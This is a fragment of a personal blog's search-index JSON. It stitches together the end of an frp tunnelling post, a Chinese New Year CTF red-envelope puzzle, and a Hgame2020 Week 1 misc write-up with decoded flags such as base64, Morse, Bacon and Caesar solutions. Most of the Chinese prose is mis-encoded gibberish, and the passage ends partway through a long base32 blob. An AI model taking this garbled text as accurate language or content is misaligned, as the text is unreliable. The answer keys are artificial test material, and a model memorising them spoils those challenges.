å¥½äº†ï¼Œå®Œäº‹ï¼ æºœäº†æºœäº†ã€‚ Reference å®˜æ–¹ä»“åº“åŠä»‹ç» https://github.com/fatedier/frp å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ https://github.com/fatedier/frp/blob/master/README_zh.md https://www.iplaysoft.com/frp.html Frpåå°è‡ªåŠ¨å¯åŠ¨çš„å‡ ä¸ªæ–¹æ³• https://blog.csdn.net/x7418520/article/details/81077652 Systemd æœåŠ¡ç®¡ç†æ•™ç¨‹ https://cloud.tencent.com/developer/article/1516125 å°æƒ³æ³• | åŸºäºVSCodeå’Œsshå®ç°è¿œç¨‹ç¼–ç¨‹/ç‚¼ä¸¹ è¿˜çœ‹åˆ°è¿‡ä¸€ä¸ªå…è´¹çš„å†…ç½‘ç©¿é€æœåŠ¡ï¼ŒSakura Frp https://www.natfrp.com/","path":"2020/01/29/Server_frp/"},{"title":"2020é¼ å¹´å¿«ä¹ï¼æ¥ç©çº¢åŒ…é—¯å…³å§ï¼","text":"é¼ å¹´å¿«ä¹åˆæ˜¯ä¸€å¹´æ˜¥æ¥åˆ°ï¼Œé¼ å¹´çš„é’Ÿå£°æ•²å“äº†ï¼ é¼ ä½ å¥åº·ï¼Œé¼ ä½ å¹³å®‰ï¼Œé¼ ä½ å¿«ä¹å–µ~ è¿™ä¸€å¹´è¿‡çš„å¤ªéš¾äº†ï¼Œè¿˜è¦æ„Ÿè°¢å¤§å®¶çš„é™ªä¼´å“ˆï¼ æœ€è¿‘æ–°å‹å† çŠ¶ç—…æ¯’æ„ŸæŸ“çš„è‚ºç‚æ¥äº†ï¼Œå…¬å…±åœºæ‰€éƒ½å…³é—­äº†emmm æ­¦æ±‰åŠ æ²¹ï¼ä¸­å›½åŠ æ²¹ï¼ è¿‡å¹´äº†ï¼Œå¤§å®¶éƒ½è¦å¥åº·å¿«ä¹å‘€ï¼ çº¢åŒ…é—¯å…³è¯´åˆ°è¿™ä¸ªçº¢åŒ…é—¯å…³ï¼Œæœ€å¼€å§‹æ˜¯å¬è¯´æœ‰å­¦é•¿çš„çº¢åŒ…é—¯å…³ï¼ŒFJJ å­¦é•¿ä¹Ÿå¼„è¿‡ä¸€ä¸ªï¼Œå…ƒæ—¦çš„æ—¶å€™ç™½å¸ˆå‚…æ‰”äº†ä¸ªRSAçš„å¯†ç çº¢åŒ…ï¼ŒMilkice çš„å¹´ç»ˆæ€»ç»“é‡Œä¹Ÿå‡ºäº†é“çº¢åŒ…é¢˜ã€‚ åæ­£å°±æŒºæœ‰æ„æ€çš„å˜›23333 æˆ‘çš„è¯å…¶å®å…ƒæ—¦çš„æ—¶å€™å°±æƒ³å¼„äº†ã€‚ ä¸è¿‡é‚£æ—¶å€™ä¸€å †è€ƒè¯•ï¼Œå»å¹´12.31ä¸‹åˆå…­ç‚¹å¤šæ‰è€ƒå®Œé«˜é¢‘ï¼Œåé¢åˆè¦è€ƒDSPï¼Œæ ¹æœ¬æ²¡ç©ºå‡ºé¢˜â€¦â€¦ æ‰€ä»¥ï¼Œä¸å¦‚è¶ç€æ˜¥èŠ‚å‡ºé“é¢˜ç©ç©å‘€ï¼ é¢˜ç›®æ¥äº†å°±å‡ºä¸ª Misc çš„é¢˜å§ï¼ŒèŠ±äº†ä¸€ç•ªå¿ƒæ€ï¼Œåšé¢˜çœ‹è„‘æ´å§ï¼Œå¯ä»¥å¥½å¥½ç©ç©ï¼ ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚æ·±å…¥äººå¿ƒï¼Œé‚£æˆ‘ä»¬å°±ä»è¿™å¼€å§‹å§ï¼ è‡ªç”±è¯šä¿¡è‡ªç”±è‡ªç”±æ–‡æ˜å’Œè°æ–‡æ˜è‡ªç”±çˆ±å›½è‡ªç”±æ•¬ä¸šå’Œè°è‡ªç”±è‡ªç”±è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±çˆ±å›½è‡ªç”±æ•¬ä¸šå¹³ç­‰çˆ±å›½å¹³ç­‰ å’Œè°å’Œè°å…¬æ­£å’Œè°å’Œè°è‡ªç”±å‹å–„å…¬æ­£è‡ªç”±å‹å–„è‡ªç”±è‡ªç”±å‹å–„æ³•æ²»è‡ªç”±å…¬æ­£å¹³ç­‰çˆ±å›½å¹³ç­‰çˆ±å›½è‡ªç”±æ•¬ä¸šå’Œè°å’Œè° å’Œè°å’Œè°è‡ªç”±å‹å–„æ•¬ä¸šå¹³ç­‰å¯Œå¼ºè‡ªç”±å¹³ç­‰å¹³ç­‰çˆ±å›½è‡ªç”±çˆ±å›½å¹³ç­‰æ°‘ä¸»å’Œè°å…¬æ­£è‡ªç”±å‹å–„å…¬æ­£å’Œè°æ–‡æ˜è‡ªç”±å…¬æ­£ å’Œè°å¹³ç­‰è‡ªç”±å‹å–„è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»å¹³ç­‰æ°‘ä¸»å’Œè°å’Œè°å¹³ç­‰å’Œè°è‡ªç”±æ•¬ä¸šå¹³ç­‰å…¬æ­£å’Œè°æ–‡æ˜è‡ªç”±è‡ªç”±è‡ªç”± è¯šä¿¡æ°‘ä¸»è‡ªç”±è¯šä¿¡æ–‡æ˜å’Œè°å’Œè°è‡ªç”±å¹³ç­‰è‡ªç”±å‹å–„æ•¬ä¸šè‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»å¹³ç­‰æ°‘ä¸»å’Œè°è‡ªç”±è‡ªç”± å‹å–„å…¬æ­£è‡ªç”±å‹å–„æ³•æ²»è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å…¬æ­£å’Œè°å’Œè°å¹³ç­‰æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰æ•¬ä¸šè‡ªç”±è¯šä¿¡æ–‡æ˜è‡ªç”±è¯šä¿¡å’Œè° è‡ªç”±è¯šä¿¡è‡ªç”±è‡ªç”±å‹å–„è‡ªç”±å¹³ç­‰æ³•æ²»è‡ªç”±æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±å¹³ç­‰è‡ªç”±å‹å–„çˆ±å›½å¹³ç­‰å‹å–„ è‡ªç”±å¹³ç­‰çˆ±å›½å¹³ç­‰çˆ±å›½è‡ªç”±æ³•æ²»è‡ªç”±å‹å–„å…¬æ­£å’Œè°å’Œè°å¹³ç­‰è‡ªç”±è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰å…¬æ­£è‡ªç”±æ³•æ²» è‡ªç”±æ•¬ä¸šå’Œè°æ–‡æ˜è‡ªç”±è¯šä¿¡æ–‡æ˜å¹³ç­‰å¯Œå¼ºè‡ªç”±æ³•æ²»è‡ªç”±è¯šä¿¡å¯Œå¼ºå¹³ç­‰æ•¬ä¸šå¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»å’Œè°è‡ªç”±å¹³ç­‰è‡ªç”± è‡ªç”±è¯šä¿¡æ–‡æ˜è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰æ–‡æ˜å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±å’Œè°å’Œè°å’Œè°å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±è¯šä¿¡å’Œè°å¹³ç­‰ æ–‡æ˜å¹³ç­‰æ³•æ²»è‡ªç”±è‡ªç”±å¹³ç­‰æ³•æ²»å’Œè°æ–‡æ˜å’Œè°å’Œè°è‡ªç”±å‹å–„å¹³ç­‰è‡ªç”±è¯šä¿¡å’Œè°å¹³ç­‰è¯šä¿¡å¯Œå¼ºå¹³ç­‰æ³•æ²»è‡ªç”±æ³•æ²» å¹³ç­‰æ³•æ²»å¹³ç­‰è¯šä¿¡å¯Œå¼ºè‡ªç”±å‹å–„å…¬æ­£è‡ªç”±å‹å–„å¹³ç­‰è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰æ³•æ²»è‡ªç”±è‡ªç”±å¹³ç­‰æ³•æ²»å¹³ç­‰ å‹å–„è‡ªç”±å’Œè°å’Œè°è‡ªç”±æ³•æ²»è‡ªç”±æ³•æ²»è‡ªç”±è¯šä¿¡å’Œè°å¹³ç­‰çˆ±å›½å¹³ç­‰å¹³ç­‰è‡ªç”±å’Œè°è‡ªç”±è¯šä¿¡å’Œè°è‡ªç”±è¯šä¿¡æ–‡æ˜å¹³ç­‰ è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±æ–‡æ˜è‡ªç”±è‡ªç”±è‡ªç”±è‡ªç”±è‡ªç”±æ•¬ä¸šå’Œè°æ–‡æ˜å’Œè°å’Œè°è‡ªç”±å…¬æ­£è‡ªç”±æ³•æ²»è‡ªç”±æ•¬ä¸šå¹³ç­‰è¯šä¿¡å¯Œå¼º å¹³ç­‰è‡ªç”±è‡ªç”±æ³•æ²»è‡ªç”±å‹å–„æ³•æ²»å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰è‡ªç”±è‡ªç”±å…¬æ­£å’Œè°å¹³ç­‰è‡ªç”±æ³•æ²»å¹³ç­‰æ³•æ²»å¹³ç­‰å’Œè°å¹³ç­‰æ•¬ä¸š è‡ªç”±å‹å–„å…¬æ­£å¹³ç­‰å¯Œå¼ºè‡ªç”±å…¬æ­£å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰å¹³ç­‰è‡ªç”±çˆ±å›½è‡ªç”±æ•¬ä¸šå’Œè°å’Œè°è‡ªç”±è¯šä¿¡æ–‡æ˜è‡ªç”±å‹å–„æ³•æ²» æ€»å…±æœ‰4ä¸ªFlagï¼Œå¯¹åº”ç€4ä¸ªAlipayçº¢åŒ…ã€‚ å½¢å¼éƒ½æ˜¯ MIAO{.+} ï¼Œå¯èƒ½æ˜¯ çº¯æ•°å­— æˆ– çº¯æ±‰å­—ã€‚ å¦‚æœçº¢åŒ…è¿‡æœŸäº†ï¼Œ1æœˆ31æ—¥å‰ç›´æ¥ç§æˆ³æŠŠflagå‘ç»™æˆ‘å°±å¥½äº†å–µï¼ åé¢å†å‘å‡ºé¢˜è®°å½•å’ŒWPã€‚ï¼ˆå’•å’•å’• æ³¨æ„è§£å‡ºæ¥çš„flagä¸è¦éšä¾¿å‘ç»™åˆ«äººå•Šï¼ï¼ï¼ Hinté—¯å…³éœ€è¦ä¸€å…³ä¸€å…³è¿‡å˜›ï¼Œå¯èƒ½æœ‰ç‚¹éš¾åº¦ï¼Œç»™ç‚¹å°æç¤ºå§ã€‚ å¥—å¨ƒæŒºå¥½ç©çš„ï¼Œæ¯”å¦‚è¿™å›ä¸€ä¸ªæ–‡ä»¶é‡Œå¥—äº†å¥½å‡ ä¸ªï¼Œflagå°±è¶ŠåŸ‹è¶Šæ·±23333ã€‚ ç¼–ç å®¶æ—é‡Œï¼Œbase64æŒºå¸¸ç”¨çš„ï¼Œä½†åˆ«åªæƒ³ç€å®ƒå§ã€‚å“¦å¯¹äº†ï¼Œç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ä¹Ÿå¯ä»¥ç”¨æ¥ç¼–ç çš„å‘¢ã€‚ å–µå–µå¶å°”ä¼šå’Œå°ä¼™ä¼´å‘é‚®ä»¶äº¤æµã€‚ å–µå–µå¶å°”ç”¨PhotoShopä¿®ä¿®å›¾ä»€ä¹ˆçš„ï¼Œå¯èƒ½è¿˜ä¼šå¾€å›¾ç‰‡é‡Œè—ç‚¹ä»€ä¹ˆæœ‰æ„æ€çš„ä¸œè¥¿ï¼Œå½“ç„¶å·¥å…·ä¸åªæ˜¯PSã€‚ åå…­è¿›åˆ¶ç¼–è¾‘å™¨åœ¨æ‰‹ï¼Œæœ‰å¯èƒ½å“ªå¤©ä¸€ä¸å°å¿ƒæŠŠæ–‡ä»¶æ”¹é”™äº†å°±æ‰“ä¸å¼€äº†æˆ–è€…è¯´æŸåäº†ã€‚ äºŒç»´ç æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œèƒ½ä¼ é€’çš„ä¿¡æ¯ä¸åªæ˜¯ç½‘å€ï¼Œè¿˜æœ‰â€¦â€¦ä½†æ˜¯å‰ææ˜¯ä½ èƒ½æ‰¾åˆ°å®ƒã€‚ å–µå–µå–œæ¬¢ç”¨Pythonæ¥ç ä»£ç ï¼Œå¾ˆå¤šç°æˆçš„åº“è´¼æ–¹ä¾¿ã€‚è€Œä¸”ç¼–è¯‘åâ€¦â€¦ ä¸­æ–‡çš„è¯æœ‰å¯èƒ½éœ€è¦å€ŸåŠ©Unicodeç¼–ç ã€‚ ä¸€æ­¥æ­¥æ·±å…¥è¿˜ä¼šæœ‰è¿›ä¸€æ­¥çš„æç¤ºï¼Œå¤‡æ³¨æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚ ï¼ˆæˆ‘ä¹Ÿä¸è®°å¾—äº†ï¼Œè‡ªå·±æƒ³å§2333 Just have funï¼æœ‰é—®é¢˜æ¬¢è¿ç•™è¨€ï¼Œæˆ–è€…ç§æˆ³å‘€ï¼ é¢˜è§£ / Writeupå–µå–µæ‡’å¾—å†™äº† æ”¾å¸ˆå‚…ä»¬çš„é¢˜è§£å‚è€ƒä¸€ä¸‹å§ï¼ Dawn_whisper: MiaoTonyâ€™s 2020æ˜¥èŠ‚å¥—å¨ƒé¢˜ (archive) ï¼ˆè¿‡å»æœ‰ç‚¹ä¹…ï¼Œå–µå–µä¹Ÿæ‰¾ä¸åˆ°å…¶ä»– wp äº† Update: Add writeup on 20220428.","path":"2020/01/25/CTF_2020HappyChineseNewYear/"},{"title":"CTF | Hgame2020 Week1 WriteUp","text":"å‰è¨€è¿™å‡ å¤©ç©äº†ç©æ­å·ç”µå­ç§‘æŠ€å¤§å­¦çš„Hgame2020ï¼Œè¿˜åˆ«è¯´ï¼Œæœ‰ç‚¹æ„æ€2333ã€‚ å¹³å°ç½‘å€ï¼š https://hgame.vidar.club/ Flagæ ¼å¼ï¼šhgame{.+} 20200125 æ›´æ–°ï¼š å®˜æ–¹WPåœ°å€ï¼šhttps://github.com/vidar-team/Hgame2020_writeup MISCç­¾åˆ°é¢˜Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t base64è§£ç å¾—åˆ° .-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...-- ä¸€çœ‹å°±æ˜¯æ‘©æ–¯ç”µç ï¼ŒåŠ å…¥åˆ†éš”ç¬¦åè§£ç å¾—åˆ°flag W3LC0ME_TO_2020_HGAM3 åœ¨çº¿è§£å¯†æ‘©æ–¯å¯†ç  www.atool9.com/morse.php å£çº¸è§£å‹å¾—åˆ°å›¾ç‰‡Pixiv@ç´”ç™½å¯æ†.jpgï¼Œforemostæå–å¾—åˆ°ä¸€ä¸ªzipå‹ç¼©æ–‡ä»¶ã€‚å¤‡æ³¨æç¤º Password is picture ID. æœ¬æ¥è¿˜ä»¥ä¸ºæ˜¯åœ¨å›¾ç‰‡çš„æ–‡ä»¶é‡Œï¼Œè€Œä¸”è¿˜æ‰¾åˆ°äº†ä¸€ä¸ªidå±æ€§ï¼Œç„¶è€Œå¹¶ä¸æ˜¯ã€‚ ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ç´”ç™½å¯æ†ï¼Œå‘ç°æ˜¯Pç«™ç”»å®¶ï¼Œçœ‹äº†ä¸€ç¯‡ä»‹ç»åŸæ¥æ¯å¼ å›¾ç‰‡æœ‰ä¸ªç¼–å·æ¥ç€ã€‚ è¯•äº†è¯•ç™¾åº¦æœå›¾ï¼Œå‡ºæ¥çš„ç”»é£æœ‰ç‚¹ä¸å¯¹åŠ²emmmã€‚å¹²è„†ç›´æ¥ä¸ŠPç«™æœï¼Œç„¶ååœ¨é¡µé¢ä¸Šæ‰¾åˆ°äº†è¿™å¼ å›¾ã€‚ ï¼ˆè¿˜åˆ«è¯´ï¼ŒæŒºå¥½çœ‹çš„å“‡ï¼Œè¿˜æ˜¯ä¸ªä¸­å›½ç”»å¸ˆå–µã€‚ å¤©æ„ https://www.pixiv.net/artworks/76953815 å¾—åˆ°ID 76953815ï¼Œä½œä¸ºå¯†ç è§£å‹flag.txtï¼ˆè¿™ä¹ˆçŸ­è¿˜å…¨æ•°å­—ï¼Œå…¶å®å¯ä»¥æš´åŠ›ç ´è§£çš„ï¼‰ï¼Œå¾—åˆ° \\u68\\u67\\u61\\u6d\\u65\\u7b\\u44\\u6f\\u5f\\u79\\u30\\u75\\u5f\\u4b\\u6e\\u4f\\u57\\u5f\\u75\\u4e\\u69\\u43\\u30\\u64\\u33\\u3f\\u7d Unicodeå•¦ï¼Œè½¬ASCIIï¼ˆç”¨çš„æ˜¯NATIVEè½¬ASCIIæ¥ç€ï¼‰å¾—åˆ°flag hgame{Do_y0u_KnOW_uNiC0d3?} å…‹è‹é²ç¥è¯æ˜æ–‡æ”»å‡»å¾—åˆ°äº†è§£å¯†åçš„zipæ–‡ä»¶ã€‚ å¾—åˆ°åŠ å¯†çš„ The Call of Cthulhu.docæ–‡ä»¶ã€‚æ ¹æ® Bacon.txtæ–‡ä»¶æç¤ºå¯»æ‰¾å¯†ç ã€‚ of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd. *Password in capital letters. ç„¶è€Œä¸æˆåŠŸï¼Œä¸çŸ¥é“æ€ä¹ˆåšä¸‹å»äº†å˜¤å˜¤å˜¤ã€‚ &gt;&gt;&gt; s='of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd' &gt;&gt;&gt; s1=[i for i in s if i&gt;='A' and i&lt;='Z'] &gt;&gt;&gt; s1 ['S', 'C', 'G', 'E', 'A', 'O', 'R', 'N', 'G', 'S', 'H', 'B', 'E', 'C', 'E', 'A', 'A', 'S', 'R', 'I', 'F', 'H', 'G', 'R', 'E', 'O', 'T', 'E', 'O'] &gt;&gt;&gt; ''.join(s1) 'SCGEAORNGSHBECEAASRIFHGREOTEO' 20200125 æ›´æ–°ï¼š çœ‹äº†å®˜æ–¹WPæ‰çŸ¥é“BanconæŒ‡çš„æ˜¯åŸ¹æ ¹å¯†ç ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯å’¸è‚‰/ç†çŒªè‚‰æ¥ç€ã€‚ã€‚ æ ¹æ®å¤§å°å†™è½¬ä¸ºaæˆ–bï¼Œæ¯”å¦‚å°å†™ä¸ºaï¼Œå¤§å†™ä¸ºbã€‚ flagéšè—åœ¨æœ€åemmm Ctrl+DæŠŠéšè—å–æ¶ˆæ‰å°±çœ‹åˆ°äº†ã€‚ hgame{Y0u_h@Ve_F0Und_mY_S3cReT} ç­¾åˆ°é¢˜ProPlusPassword.txtæç¤ºäº† Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn. JRFVJYFZVRUAGMAI Three fences first, Five Caesar next. English sentense first, zip password next. ä¸€å¼€å§‹è¿˜ä»¥ä¸ºå‰é¢çš„æ˜¯3ä¸ªæ …æ ï¼Œåé¢çš„æ˜¯5ä¸ªå‡¯æ’’ï¼Œç„¶åè¯•äº†åŠå¤©éƒ½ä¸å¯¹ã€‚ çªç„¶ä¸€æƒ³åº”è¯¥æ˜¯å…ˆæ …æ å†å‡¯æ’’ï¼Œä¸€è¯•æœç„¶ã€‚ å…ˆè§£å¯†zipå¯†ç ï¼šæ …æ å¾—åˆ°JFARZGFVMVRAJUIYï¼Œå‡¯æ’’å¾—åˆ°å¯†ç  EAVMUBAQHQMVEPDTã€‚è§£å‹å¾—åˆ° OK.txtã€‚ åŒæ—¶ä¸Šé¢çš„é‚£å¥è¯åŒç†è§£å¯†å¾—åˆ° Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice. emmmä¸å¤§ç†è§£ï¼Œä¸ç®¡äº†ã€‚ çœ‹æ–‡ä»¶æ˜¯Ook!ç¼–ç ï¼Œè§£å¯†å¾—åˆ°base32ç¼–ç ã€‚ data:text;base32,NFLEET2SO4YEWR3HN5AUCQKBJZJVK2CFKVTUCQKBKFIUCQKBIVCUGQKZIFAUCRCPINCW6S2BIFAU6V2VNRCVCVSSGRXE6MTBKM3DIRKOO53UIMZPGB3DOV3ZINJVOOCHMNCTQ33LMJFXEQKPHBQSW3CBKNLC6MRTIFAUIKZVMM4WIQKBIRVWOQ2FIF3UCY2NIFIUCK2ZIFTUCOCBIZCECSKBKBDUCSKBMZGUCUKBJ5AUI2DHIFAUQN2ZJU2GKL3WNIXWINBQM5CTANJZOZHG2YLYLJQW6L2KMIYXGM3YJMYFIVRWK52G25LNMFYGMYKZF5GFUMKRHF3TMY2WLBQXC4DNOVLVO4KQPFLTSYSOHBJXIRJRMVWHEWTSOBWXCWBSNVIHSMTEKVIGGT3OIZLDE4LRLJZGY3DRNI4GY5SXPJTEK4SSJZMHAYJSME3FU4LMHFYGUODUNZLEIM2EOB4FMZDROFWWCNK2MFXS6STCGFZTG6CLGBKFMNSXORWXK3LBOBTGCWJPJRNDCUJZO43GGVSYMFYXA3LVK5LXCUDZK44WETRYKN2EKMLFNRZFU4TQNVYVQMTNKB4TEZCWJ5FU66BRNRXHON2OJRAXGVLVOR5HGTCJMJ3XMNLNFNVUE2SDFM3XC3LHPFCVKTLOGBUE2WKUGNSFKMCIKF4WQ2ZLNNFGSQ2PF5ZG2ZZWI5KU22RQNBRVCUJTORRTCSCRPFUGWT3LJRUVGRZYOIZHGNSHIVEWQMDYMNJVCM3IMYYTGULXNBCUW3KMPFJUOOCMGZ2TMV2BJFUFK6DGKNAXU2DGKYZVIR2XHBEXCULUGBIXAOCPPJLEU6BXKVRDGRCPKI4WI2LEJZDGMYKFKBUDEYLQMVGGC2TFGRNHSUDWONKHA33RG5AWYOKPNJJEY6DCKVRDGVCPKE4TS3LEJZDFQWKFF5YDAYKKMFFWC6TFGZNHSRDWON5HI4DROJAW4OKPNZIUYQSYLBRG4VCQKFHDK3TEHFFFKWKVF5XTANSGLJFXCN3EGZFDMQTWJUXXK4CLNZBW45CDNZITOTSVLBGHMUSQKFHDK3RZGFFFKNCVHFXVKK2ILJYW2NDEOFHDOQTWJEVXKNKPNVBW45CDNZ3TOTSVNZEHIUTWMNGTKSBRGJFDAMCWHFXVCK2ILJYWYNDUOFHDO2DOJEVSW6CPNVUXC43VNM4TC6TUKJDGGMTJNVZEMODEJQZVMTZSGMYTESRQGBLFM5BSNZHW2ZTRN5VGWMCVHFQXM2TQMM3HAKZQFN2TKT3NINYXM5KVGUYHUZDEIVRW22LOOJLDQZCMNZSE4MTOHEYUUVJUKZLDSNTOJ5WWE4DPIRZTEVJZMF3GU4DDGVYHKOBPOVYEW3SDOF3HIVJVGB4GITSJMRWXS5TSKY4FMTDOORHDC3TEHFFFKWLEKY4XC3SPNVGHA4CEJUZFQOJWNZUXAYZZOJ2XG6TUOBYXERDRKB2FKNKVPBTE4322NV4WM3SXHAYUI3DUHE4W2ZCOIZLFSZC2F5YW4S3NJQ2XIQSNK5RDQNSYOVYWG5DWOZZVI4DPOFZEY4CQMRRTOVKSLBHG64DRPBTEQUZZGFKHI5BZMRUWITSGKZRGI4D2OBXDM4KJGVHEMUCXOI2DMWCPOFTHIUDSOVKHAZ3SOI3HMTKXPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3ZUGNUEOULDM4YG6MKOIRMGIZCTKZZG6UKSIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFAUMRCLIFJEI4KBJZCHCQKGIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFBUQYKFI42TKM2ZJZ4UOSLDPFLHESTNOQ3XU5DFKNFHK2TCNFYHGWDCNJFVOTLMMEZWETBSGU2G4NDUMFEW26DQOJHDKNDZKZZEU3LUG55HIZKTJJ2WUYTJOBZVQYTKJNLU23DBGNREYMRVGRXDI5DBJFWXQ4DSJY2TI6KWOJFG25BXPJ2GKU2KOVVGE2LQONMGE2SLK5GWYYJTMJGDENJUNY2HIYKJNV4HA4SOGU2HSVTSJJWXIN32ORSVGSTVNJRGS4DTLBRGUS2XJVWGCM3CJQZDKNDOGR2GCSLNPBYHETRVGR4VM4SKNV2DO6TUMVJUU5LKMJUXA42YMJVEWV2NNRQTGYSMGI2TO3RZOBTHOQ3TMN3WYYSVGUVW4VDQIFTCWQTVNNKWWSDXINDUCTRZIEZVGS2TIR3UERDHI4VWOYTIJBFEENCBNB3UIZCROQ2GU22BHBAVCNCCOVXVOMCUPFAVOQKJHBATGVKMKNGDKQKEIFCSWQLCOFDHARRYIFBGOQ3GIFHDC2JQM4VUCQLXIJ3HISBLOAVUUMSZLFRGYU2GGFQWYN3CMRSWU2DJJJSTSMRZGU3HI2CTJBMSWMKUK42WK2CUK5NHG2SWOZFHKZBLF5NFO2DJIN3FKOLMLBMTIK3MMJKTKWLJLB3GI5TFMVZFSVLIGJIHIVJROVMG6VJRNVRESMLCPFRG4ZTWGJLG6WLHOIYVAWSWGJHVA4CXGFHVOSLMG4ZWEM3OOEZEMSLENI3VMTTCNQ3EMTS2NV4U4VZYNU2TGNZZNRQUOSKLHFKDEVTENJVDMVTUKRWGSSTFHEZDSNJWORUFGSCZFMYVIVZVMVUFIV22ONVFM5SKOVSCWL22K5UGSQ3WKU4WYWCZGQVWYYSVGVMWSWDWMR3GKZLSLFKWQMSQORKTC5KYN5KTC3LCJEYWE6LCNZTHMMSWOBUVCMKEI5UWQWLUHFDEEY3FNZKDGMCKGFIG4VCOKZZTOVLXNBFDSSKYKRJVQSDUGA4WIT3EKQ2TA6SWMJBTATJUKNSFGRRYGJWFEM3DKAZWM3SVJ5LE2MKXO52EIK2JNZKVEWCQOAYGIMKEMR5DKML2NRKE4MLTJFIWM2KKGEYFM6BWMRIGMULOKUVWITJRK55HIVCDIVXDA2DEJZFGGZJTKQYTANJRKBXFITSWONGFC6TIJIYUSWD2MFLEQZDXF5SCWZCRGVKXUVTCIMYFANDJMRJEMYZLNZJDGVKOGNIG4WCPKZGTGV3XNBBCWSLOLBJFQSDQGA4TSQ3EKQ2TA6SWMJHTCTTHGFBFGZSLM5GECTLXGVEFE33QON5FUSCXOVMEKM2ZIRIXS2BWIRVDEVKKJUVXATZZLF2UUK3XI5UGYRBQJBEG632TLI2VIZBWPBSFI5DHJZCEWSDPJ5TFEULLNJ4W4N3MNE3W4TCBMJDUKTCSMMVWS2CKJBWE6M3CIYZE6V2FGNGUSU3JGU4UERCTMZFWG5LNKB2GG42KOVMUC2CGPI3EOSDLOVITKZDDMZQTKWKUMR3UEQ2LNZVU2UCKMNWHUNTPGYYXS53NG5TVGRKVKBMWGZKTOBGG4MKCGFZGY6COGJATATLPMVTTIOLMINKFA4KUOZLUY2LGONJHM5LWPE4XKRTIKI3UWYTNGNFHAR3RMJXEITRRPJ5EGRKJLFHEWSTMLBRDKSTZOBSTIWLIIRBGYVKNOFXGCSTVMRGTGVCNJVMWG2LHNNVW4VSONJWG4NTQGVUEGRKNI5WFK6LRORZWWNKVF5RU2ULYM54XCR2SKN2FKM2PNVRHA3SHJVFVCUKTK5KHC3JRPF5HIUJZO54EGR2EINYVUVSHGJKGGNTCOVDVSWLXLJDEISTQI5YWE3SEJYYXU6SDIVEVSTSLJJWFQYRVJJ4XAZJTMFHESVDIKE4XA3JYGNATM22TPB2DQ6CFN53UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZZXOQSEJVMVC2BQLF3W443XIJCE2WKRNAYFS53OON3UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZ2GSRCVJBNGORCMK5BWGZDQI5MHA332NBHTAVSXJNNFKM3DIR4WY2JXHBJHQRCUGE3WCMKKO5XGCS3WIVGXCZTVIJYFG6DEOVGTK2DQGY4HIS3LGVKDSQSXNFLVMTZTKEYG6WJLGNDWG53XHFSVO3CUMM2TMZ3SKJGEY3SMN5RFKTLCMFVGKY2ZMV3EYU3QOVMTQUKWONWGY2TMGFHDMQ2NORJHMUCNMZKGW4CVGNHGKWKLGJJWS6D2GZWTKQKHK5ZTG3TNKBXXSVLVMJWXMTKFMJNFMWJVORKGIZ2EJRLWE2T2JAYEUT2YJZVFQ3SDMRXXC43DPFYHK52GNRZE4MJUNJYUK3SMGIYXC6TIJ4YFMV2LLJKTGY2EPFWGSNZYKJ4EIVBRG5QTCSTXNZQUW5SFJVUWI3CZMQYU43TQIJKHSWCUJZWE2Z2QKJQXQSBWOA2WQQ2FJVDTCWRTKRXVU22TFNQUOSJZKVVGITLXPBUHSS2DGZRXU3ZQKV4USL2GJRCWK4KYOVDUSULXLJLEQZCPNAZFUSZVJFRWSMLJJYYXU6SDIVEVS